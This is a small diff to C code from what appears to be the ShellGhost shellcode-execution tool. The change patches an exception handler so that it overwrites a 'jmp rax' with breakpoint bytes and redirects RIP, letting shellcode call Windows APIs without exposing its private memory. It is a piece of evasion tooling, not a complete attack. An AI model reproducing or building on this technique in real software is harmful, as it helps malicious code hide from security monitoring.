@@ -11,6 +11,7 @@
 #include "ShellGhost.h"
 
 
+
 // Check memory protection of prv allocation
 DWORD CheckAllocationProtection(LPVOID allocation, DWORD allocation_size)
 {
@@ -215,8 +216,9 @@ LONG CALLBACK InterceptShellcodeException(EXCEPTION_POINTERS* exceptionData)
 
 			if (*(WORD*)(WORD*)exceptionData->ContextRecord->Rip == 0xe0ff) // jmp rax
 			{
+				*(WORD*)(WORD*)exceptionData->ContextRecord->Rip = 0xCCCC;	// we'll never execute that jmp rax...
 				AdjustFunctionParameters(exceptionData->ContextRecord);
-				exceptionData->ContextRecord->Rip = exceptionData->ContextRecord->Rax; // override PRV allocation when calling winapi
+				exceptionData->ContextRecord->Rip = exceptionData->ContextRecord->Rax; // ...override PRV allocation when calling a winapi
 				RestorePreviousInstructionBreakpoint(previous_instruction);
 				
 				return EXCEPTION_CONTINUE_EXECUTION;
